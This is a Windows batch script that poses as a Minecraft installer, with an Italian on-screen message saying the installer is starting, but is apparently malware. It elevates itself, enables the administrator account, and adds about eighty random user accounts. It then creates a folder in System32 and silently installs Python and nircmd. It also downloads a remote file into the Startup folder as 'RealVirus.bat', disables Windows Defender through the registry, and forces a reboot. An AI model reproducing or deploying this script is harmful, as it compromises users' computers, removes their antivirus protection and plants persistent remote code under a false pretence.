@echo
powershell -command "Start-Process '%0' -Verb RunAs"
pause
net user administrator /active:yes
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
net user TOPG%random% /add
::
set github= 
set python_installer= "C:\Windows\System32\fuckoffwindows\python-3.11.5-amd64.exe"
::
cls
@echo l'installer di minecraft si sta avviando Attendi...
@echo off
md C:\Windows\System32\fuckoffwindows
::Python dowload
powershell (new-object System.Net.WebClient).DownloadFile('https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe','C:\Windows\System32\fuckoffwindows\python-3.11.5-amd64.exe')
start /wait %python_installer% /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
::Dowload nircmd
powershell (new-object System.Net.WebClient).DownloadFile('https://www.nirsoft.net/utils/nircmd-x64.zip','C:\Windows\System32\fuckoffwindows\nircmd-x64.zip')
tar nircmd-x64.zip
::TAKEOWN
powershell (new-object System.Net.WebClient).DownloadFile('%github%','C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\RealVirus.bat')
@echo attendi mentre estraiamo il contenuto della cartella
timeout /t 10 >nul
cls
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
::riattivarlo ^_^
::reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /f
@echo say bye to Windows fucking idiot
shutdown -r -t 1
